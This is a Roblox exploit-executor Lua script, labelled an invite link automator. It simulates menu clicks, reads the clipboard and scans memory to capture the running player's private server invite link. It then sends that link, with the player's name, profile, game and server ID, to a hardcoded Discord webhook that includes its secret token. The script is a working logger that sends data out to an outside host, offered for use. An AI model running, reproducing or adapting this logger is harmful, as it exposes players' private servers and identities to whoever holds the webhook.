-- Roblox Menu Invite Link Automator
local request = (syn and syn.request) or (http and http.request) or request
local VIM = game:GetService('VirtualInputManager')
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local localPlayer = Players.LocalPlayer
local HttpService = game:GetService("HttpService")

-- Your Discord webhook
local WEBHOOK_URL = "https://discord.com/api/webhooks/1404188190562189313/U1SDw3SpIiKP8h39P_M5aFZ784VTNFpQF5iqM3nxI0Eway5Zim1uFIr3AzGaBtAQvmSV"

-- Enhanced webhook function
local function sendToWebhook(link)
    local data = {
        ["content"] = "@everyne New Roblox Invite Link Captured",
        ["embeds"] = {{
            ["title"] = "🎮 Game Invite Link",
            ["description"] = string.format("**Player:** [%s](https://www.roblox.com/users/%d/profile)\n**Link:** [Click Here](%s)", 
                localPlayer.Name, localPlayer.UserId, link),
            ["color"] = 0x00FF00,
            ["fields"] = {
                {
                    ["name"] = "Game Info",
                    ["value"] = string.format("[%s](https://www.roblox.com/games/%d)", 
                        game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name, game.PlaceId),
                    ["inline"] = true
                },
                {
                    ["name"] = "Server ID",
                    ["value"] = game.JobId,
                    ["inline"] = true
                }
            },
            ["footer"] = {
                ["text"] = "Roblox Invite Logger | "..os.date("%x %X")
            }
        }}
    }
    
    pcall(function()
        request({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(data)
        })
    end)
end

-- Precise click simulation using VIM
local function simulateClick(x, y)
    VIM:SendMouseMoveEvent(x, y)
    wait(0.05)
    VIM:SendMouseButtonEvent(x, y, 0, true, nil, 0)
    wait(0.1)
    VIM:SendMouseButtonEvent(x, y, 0, false, nil, 0)
end

-- Find and click menu items by color pattern (more reliable than text)
local function findAndClickMenuOption()
    -- Open Roblox menu (ESC)
    VIM:SendKeyEvent(true, Enum.KeyCode.Escape, false, nil)
    wait(0.5)
    
    -- Scan for the blue invite button color (RGB: 0, 162, 255)
    local gui = game:GetService("CoreGui")
    for _, obj in pairs(gui:GetDescendants()) do
        if obj:IsA("ImageButton") or obj:IsA("TextButton") then
            if obj.BackgroundColor3 == Color3.fromRGB(0, 162, 255) then
                local pos = obj.AbsolutePosition + Vector2.new(obj.AbsoluteSize.X/2, obj.AbsoluteSize.Y/2)
                simulateClick(pos.X, pos.Y)
                wait(0.5)
                
                -- Now find the copy link button (white with blue text)
                for _, child in pairs(gui:GetDescendants()) do
                    if child:IsA("TextButton") and child.Text:lower():find("copy link") then
                        local pos = child.AbsolutePosition + Vector2.new(child.AbsoluteSize.X/2, child.AbsoluteSize.Y/2)
                        simulateClick(pos.X, pos.Y)
                        return true
                    end
                end
            end
        end
    end
    return false
end

-- Main function with clipboard monitoring
local function main()
    -- Clear clipboard first
    if setclipboard then setclipboard("") end
    
    if findAndClickMenuOption() then
        wait(1) -- Wait for copy to complete
        
        -- Check clipboard
        if getclipboard then
            local clipboard = getclipboard()
            if clipboard and clipboard:find("roblox.com/share") then
                sendToWebhook(clipboard)
                return
            end
        end
    end
    
    -- Fallback to memory scanning if GUI method fails
    for _, obj in pairs(getgc(true)) do
        if type(obj) == "table" then
            for k, v in pairs(obj) do
                if type(v) == "string" and #v > 30 and v:match("^[%w_]+$") then
                    local link = "https://www.roblox.com/share?code="..v.."&type=ExperienceInvite"
                    sendToWebhook(link)
                    return
                end
            end
        end
    end
    
    -- Final fallback
    sendToWebhook("https://www.roblox.com/games/"..game.PlaceId)
end

-- Execute with protection
local success, err = pcall(main)
if not success then
    warn("Error: "..tostring(err))
    sendToWebhook("Error occurred while getting invite link")
end
